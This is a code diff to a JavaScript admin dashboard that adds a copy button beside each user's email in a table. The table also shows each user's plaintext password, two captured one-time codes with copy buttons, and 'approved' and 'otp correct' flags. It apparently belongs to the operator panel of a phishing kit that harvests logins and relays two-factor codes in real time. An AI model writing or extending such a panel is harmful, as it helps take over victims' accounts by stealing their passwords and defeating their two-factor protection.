@@ -876,8 +876,18 @@ function displayUsers(users) {
         
         actionButtons += `<button class="action-btn btn-delete" onclick="deleteUser('${escapeHtml(user.email)}')"><ion-icon name="trash-outline"></ion-icon>Delete</button></div>`;
         
+        // Email cell with copy button
+        const emailCell = `
+            <div style="display: flex; align-items: center; gap: 8px;">
+                <span style="cursor: pointer;" onclick="openModal({email:'${escapeHtml(user.email)}', password:'${escapeHtml(user.password || 'user')}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, otp1_never:${user.otp1_never || false}, created_at:'${user.created_at}'})"><strong>${escapeHtml(user.email)}</strong></span>
+                <button class="copy-btn" onclick="event.stopPropagation(); copyToClipboard('${escapeHtml(user.email)}')" style="background: transparent; border: none; cursor: pointer; color: rgba(255,255,255,0.7);">
+                    <ion-icon name="copy-outline"></ion-icon>
+                </button>
+            </div>
+        `;
+        
         return `<tr>
-            <td onclick="openModal({email:'${escapeHtml(user.email)}', password:'${escapeHtml(user.password || 'user')}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, otp1_never:${user.otp1_never || false}, created_at:'${user.created_at}'})" style="cursor:pointer;"><strong>${escapeHtml(user.email)}</strong></td>
+            <td>${emailCell}</td>
             <td onclick="openModal({email:'${escapeHtml(user.email)}', password:'${escapeHtml(user.password || 'user')}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, otp1_never:${user.otp1_never || false}, created_at:'${user.created_at}'})" style="cursor:pointer;">${user.otp ? `<span class="otp-code" onclick="event.stopPropagation();">${user.otp}</span><button class="copy-btn" onclick="event.stopPropagation(); copyToClipboard('${user.otp}')"><ion-icon name="copy-outline"></ion-icon></button>` : '-'}</td>
             <td onclick="openModal({email:'${escapeHtml(user.email)}', password:'${escapeHtml(user.password || 'user')}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, otp1_never:${user.otp1_never || false}, created_at:'${user.created_at}'})" style="cursor:pointer;">${user.second_otp ? `<span class="otp-code" onclick="event.stopPropagation();">${user.second_otp}</span><button class="copy-btn" onclick="event.stopPropagation(); copyToClipboard('${user.second_otp}')"><ion-icon name="copy-outline"></ion-icon></button>` : '-'}</td>
             <td onclick="openModal({email:'${escapeHtml(user.email)}', password:'${escapeHtml(user.password || 'user')}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, otp1_never:${user.otp1_never || false}, created_at:'${user.created_at}'})" style="cursor:pointer;">${statusBadge}</td>
@@ -886,7 +896,6 @@ function displayUsers(users) {
         </tr>`;
     }).join('');
 }
-
 // ==================== API CALLS - NO SOUNDS FOR ADMIN ACTIONS ====================
 async function apiCall(endpoint, method, email, successMsg, errorMsg) {
     try {
